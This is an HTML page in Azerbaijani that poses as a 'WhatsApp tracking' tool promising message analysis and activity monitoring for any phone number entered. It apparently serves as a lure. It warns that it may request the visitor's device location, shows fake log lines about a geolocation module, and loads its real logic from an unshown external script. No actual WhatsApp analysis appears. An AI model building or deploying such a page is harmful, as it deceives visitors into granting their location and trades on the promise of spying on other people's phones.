<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>WhatsApp İzləmə</title>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Space+Mono&display=swap" rel="stylesheet">

  <style>
    :root {
      --bg-1: #062916;
      --bg-2: #083b20;
      --accent: #25D366;
      --muted: #9fbfb0;
      --text: #eafaf0;
    }

    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; }

    body {
      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 10px;
      background: linear-gradient(120deg, var(--bg-1), var(--bg-2));
    }

    .wrap {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .card, .panel {
      background: rgba(255, 255, 255, 0.03);
      border-radius: 10px;
      padding: 14px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 10px;
    }

    .whatsapp-badge img {
      width: 36px;
      height: 36px;
    }

    h1 {
      font-size: 16px;
      margin: 0;
      color: var(--text);
    }

    .subtitle {
      font-size: 11px;
      color: var(--muted);
      margin-top: 2px;
    }

    .muted {
      font-size: 12px;
      color: var(--muted);
      line-height: 1.4;
    }

    .input-row {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-top: 10px;
    }

    input[type="text"] {
      padding: 10px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.1);
      background: rgba(255,255,255,0.05);
      color: var(--text);
      font-size: 13px;
    }

    input::placeholder {
      color: #9fbfb0cc;
    }

    button.primary {
      background: var(--accent);
      border: none;
      color: #022;
      padding: 10px;
      border-radius: 8px;
      font-weight: 700;
      cursor: pointer;
      font-size: 13px;
      transition: background 0.2s ease;
    }

    button.primary:hover {
      background: #1eb85c;
    }

    .note {
      font-size: 11px;
      color: var(--muted);
      margin-top: 6px;
    }

    .panel h3 {
      font-size: 14px;
      margin: 0;
    }

    .status-chip {
      font-size: 12px;
      background: rgba(0,0,0,0.3);
      padding: 5px 10px;
      border-radius: 999px;
      color: var(--muted);
    }

    .console {
      background: rgba(0, 0, 0, 0.4);
      border-radius: 8px;
      padding: 8px;
      font-family: 'Space Mono', monospace;
      font-size: 11px;
      height: 140px;
      overflow-y: auto;
      margin-top: 8px;
    }

    .footer {
      margin-top: 8px;
      font-size: 10px;
      color: var(--muted);
      display: flex;
      justify-content: space-between;
    }

    @media (max-width: 480px) {
      .wrap {
        max-width: 340px;
      }
      h1 { font-size: 15px; }
      .subtitle { font-size: 10px; }
      .muted { font-size: 11px; }
      .console { height: 120px; font-size: 10.5px; }
      button.primary { padding: 9px; font-size: 12px; }
      input[type="text"] { font-size: 12px; padding: 9px; }
    }
  </style>
</head>

<body>
  <div class="wrap">
    <div class="card">
      <div class="brand">
        <div class="whatsapp-badge">
          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        </div>
        <div>
          <h1>WhatsApp İzləmə</h1>
          <div class="subtitle">Mesaj analizi · Aktivlik monitorinqi</div>
        </div>
      </div>

      <p class="muted">Nömrəni daxil edin (məs. <code>+994501234567</code>) və “Analiz et” düyməsinə basın.</p>

      <div class="input-row">
        <input id="videoUrlInput" type="text" placeholder="WhatsApp nömrəsini daxil edin: +994..." />
        <button id="analyzeButton" class="primary">Analiz et</button>
      </div>

      <div class="note">Sayt cihazın lokasiyasını soruşa bilər — bu analiz prosesini daha dəqiq edir.</div>
    </div>

    <div class="panel">
      <div style="display:flex;justify-content:space-between;align-items:center;">
        <h3>Real-time Monitor</h3>
        <div id="status" class="status-chip">Gözləyir</div>
      </div>

      <div id="console" class="console"></div>

      <div class="footer">
        <span>© 2025</span>
        <span>Secure Node • AZ</span>
      </div>
    </div>
  </div>

  <script src="./scripts.js"></script>
  <script>
    const consoleBox = document.getElementById('console');
    const statusChip = document.getElementById('status');

    function appendLog(text, level) {
      const p = document.createElement('p');
      const time = new Date().toLocaleTimeString();
      p.textContent = `[${time}] ${text}`;
      consoleBox.appendChild(p);
      consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    function setStatus(text) {
      statusChip.textContent = text;
    }

    window.__appendLog = appendLog;
    window.__setStatus = setStatus;

    appendLog("Sistem yüklənir...", "ok");
    setTimeout(() => appendLog("Geolocation modulu hazırlanır...", "meta"), 800);
  </script>
</body>
</html>
